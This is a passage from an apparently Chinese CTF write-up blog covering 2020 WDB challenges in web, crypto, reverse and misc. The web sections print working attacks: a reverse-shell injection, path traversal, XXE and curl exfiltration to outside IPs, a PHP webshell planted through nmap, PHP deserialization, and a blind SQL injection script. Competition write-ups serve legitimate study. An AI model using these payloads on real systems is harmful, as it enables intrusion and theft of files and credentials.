&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<p><strong>author</strong>和<strong>raw</strong>皆可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /edit_note</span><br><span class="line"></span><br><span class="line">id=__proto__&amp;author=bash -i &gt;%26 /dev/tcp/ip/port 0&gt;%261</span><br><span class="line"></span><br><span class="line">GET /status</span><br><span class="line"></span><br><span class="line"># flag&#123;de63de21-082b-4a9d-acbd-7d47a55840c6&#125;</span><br></pre></td></tr></table></figure>
<h4 id="filejava">filejava</h4>
<p>一个任意文件读取，<strong>/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</strong>。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.5&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>file_in_java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>upload.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>分别读取几个文件下来反编译分析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</span><br><span class="line"></span><br><span class="line">GET /file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</span><br><span class="line"></span><br><span class="line">GET /file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</span><br></pre></td></tr></table></figure>
<p>在<strong>UploadServlet</strong>中有所发现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(sheet.getFirstRowNum());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p><strong><a
href="https://www.dazhuanlan.com/2020/02/02/5e36a1acefeea/">CVE-2014-3529</a></strong>。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- [Content-Types].xml --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://106.12.140.75/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- evil.xml --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://106.12.140.75?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 182.92.125.27 - - [10/May/2020 15:16:21] &quot;GET /?file=flag&#123;5ce62daa-97ad-4535-ba77-1c37b1b56373&#125; HTTP/1.1&quot; 200 - --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="crypto">Crypto</h3>
<h4 id="boom">boom</h4>
<p><strong>MD5</strong>查出来<strong>en5oy</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z = Int(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">3</span> * x - y + z == <span class="number">185</span>)</span><br><span class="line">s.add(<span class="number">2</span> * x + <span class="number">3</span> * y - z == <span class="number">321</span>)</span><br><span class="line">s.add(x + y + z == <span class="number">173</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line">s.model()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 746831</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x * x + x - <span class="number">7943722218936282</span> == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line">s.model()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 89127561</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;en5oy_746831_89127561&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="you-raise-me-up">you raise me up</h4>
<p>丢进<strong>sage</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line">n = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line">m = Mod(m,n)</span><br><span class="line">c = Mod(c,n)</span><br><span class="line">discrete_log(c,m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="reverse">Reverse</h3>
<h4 id="bang">bang</h4>
<p>脱壳后用<strong>dex2jar</strong>就可以看到了。</p>
<p>参考文章，<a
href="https://xz.aliyun.com/t/7670"><strong>使用Frida给apk脱壳并穿透加固Hook函数</strong></a>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View paramAnonymousView)</span> &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> localEditText.getText().toString();</span><br><span class="line">  paramAnonymousView = paramBundle.getText().toString();</span><br><span class="line">  <span class="keyword">if</span> (str.equals(paramAnonymousView)) &#123;</span><br><span class="line">  	MainActivity.showmsg(<span class="string">&quot;user is equal passwd&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((str.equals(<span class="string">&quot;admin&quot;</span>) &amp; paramAnonymousView.equals(<span class="string">&quot;pass71487&quot;</span>))) &#123;</span><br><span class="line">    MainActivity.showmsg(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    MainActivity.showmsg(<span class="string">&quot;flag is flag&#123;borring_things&#125;&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  	MainActivity.showmsg(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag&#123;borring_things&#125;。</span></span><br></pre></td></tr></table></figure>
<h4 id="signal">signal</h4>
<p><strong>win32</strong>的虚拟机，逻辑很清晰，直接手动逆向即可。</p>
<p><strong>flag{757515121f3d478}</strong>。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 网鼎杯 朱雀之战 部分题解</title>
    <url>/2020-WDB-Vermilion-Bird/</url>
    <content><![CDATA[<p>。赛后秒个题。</p>
<span id="more"></span>
<h3 id="web">Web</h3>
<h4 id="nmap">nmap</h4>
<p>这题考过挺多次了，<a
href="https://southsea.st/2018-AH-National-Final/#%E8%B5%9B%E9%A2%98%E8%AF%A6%E8%A7%A3">在线工具</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[south]);?&gt; -oN shell.phtml &#x27;</span><br></pre></td></tr></table></figure>
<h4 id="phpweb">phpweb</h4>
<p><strong>p=index.php&amp;func=readfile</strong>拿到源代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>反序列化绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:26:&quot;cat /tmp/flag_c6bf23b35ba2&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="think_java">think_java</h4>
<p>给了源码，反编译。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">  <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">      dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">      user = <span class="string">&quot;root&quot;</span>; </span><br><span class="line">    <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">      pass = <span class="string">&quot;abc@12345&quot;</span>; </span><br><span class="line">    conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">    var5.printStackTrace();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">    var6.printStackTrace();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> conn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JDBC</strong>注入，<strong>dbName</strong>后<strong>?</strong>后跟参数表示链接数据库的配置，错误配置会被忽略，因此利用这点注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        paramsPost = &#123;<span class="string">&quot;x&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;dbName&quot;</span>: <span class="string">&quot;myapp?south=1&#x27; or if((mid(&#123;command&#125;,&#123;position&#125;,1)=&#x27;&#123;value&#125;&#x27;),1,0)\x23&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                          command=command, position=i, value=<span class="built_in">chr</span>(j))&#125;</span><br><span class="line">        response = session.post(<span class="string">&quot;http://123.56.249.239:8088/common/test/sqlDict&quot;</span>, data=paramsPost)</span><br><span class="line">        <span class="built_in">print</span>(paramsPost, <span class="built_in">len</span>(response.text))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(response.text) &gt; <span class="number">534</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到账号密码，<strong>admin@Rrrr_ctf_asde/admin</strong>。</p>
<p><strong>Spring
boot</strong>有个<strong>swagger-ui.html</strong>页面用作测试，登陆后给了一串<strong>token</strong>，推测是个反序列化漏洞，但没给<strong>web.xml</strong>。</p>
<p><strong>ysoserial</strong>挨个试，到<strong>ROME</strong>可用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ./ysoserial.jar ROME <span class="string">&quot;curl http://122.51.113.164/?`cat /flag`&quot;</span> |<span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
<h3 id="misc">Misc</h3>
<h4 id="九宫格">九宫格</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./QRcode/&quot;</span></span><br><span class="line">images = os.listdir(path)</span><br><span class="line">images.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[:-<span class="number">4</span>]))</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> images:</span><br><span class="line">    img = Image.<span class="built_in">open</span>(path + i)</span><br><span class="line">    barcodes = decode(img)</span><br><span class="line">    <span class="keyword">for</span> barcode <span class="keyword">in</span> barcodes:</span><br><span class="line">        res += barcode.data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">b = res.replace(<span class="string">&quot;zero&quot;</span>, <span class="string">&quot;0&quot;</span>).replace(<span class="string">&quot;one&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">d = <span class="built_in">int</span>(b, <span class="number">2</span>)</span><br><span class="line">h = <span class="built_in">hex</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(h[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;U2FsdGVkX19jThxWqKmYTZP1X4AfuFJ/7FlqIF1KHQTR5S63zOkyoX36nZlaOq4X4klwRwqa&#x27;</span></span><br></pre></td></tr></table></figure>
<p>读一下二维码，结果加了盐，根据提示，九宫格的对角线为<strong>245568</strong>，<strong>Rabbit</strong>解密。</p>
<h4 id="key123">key123</h4>
<p>根据提示输入密码为<strong>123</strong>，得到两个图。</p>
<p><strong>匙.png</strong>修复高度。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">295965569a596696995a9aa969996a6a9a669965656969996959669566a5655699669aa5656966a566a56656</span><br></pre></td></tr></table></figure>
<p>差分曼彻斯特。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long_to_bytes</span>(<span class="params">n</span>):</span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    pack = struct.pack</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        s = pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> s[i] != <span class="string">b&#x27;\000&#x27;</span>[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">b&#x27;\000&#x27;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">    s = s[i:]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MCST_diff</span>(<span class="params">str_bin</span>):</span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(str_bin) // <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">        x1 = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        x2 = str_bin[i * <span class="number">2</span> + <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> x1 == x2:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_hex = <span class="string">&#x27;295965569a596696995a9aa969996a6a9a669965656969996959669566a5655699669aa5656966a566a56656&#x27;</span></span><br><span class="line">str_bin = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(str_hex, <span class="number">16</span>)))[<span class="number">2</span>:]</span><br><span class="line">m = MCST_diff(str_bin)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x13akura_Love_Strawberry&#x27;</span></span><br></pre></td></tr></table></figure>
<p>猜个前面是<strong>S</strong>，密码为<strong>Sakura_Love_Strawberry</strong>。</p>
<p><strong>binwalk</strong>解析<strong>锁.png</strong>，拿到加密文件，输入密码，得到<strong>flag</strong>。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 网鼎杯 白虎之战 部分题解</title>
    <url>/2020-WDB-White-Tiger/</url>
    <content><![CDATA[<p>。赛后秒个题。</p>
<span id="more"></span>
<h3 id="web">Web</h3>
<h4 id="张三的网站">张三的网站</h4>
<p><strong>18</strong>年<strong>unfinished</strong>的原题，<strong><a
href="https://github.com/CTFTraining/ctftraining_exps/blob/master/wdb_2018_unfinished.py">exp</a></strong>直接打。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">email</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">&#x27;/login.php&#x27;</span>, data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;1          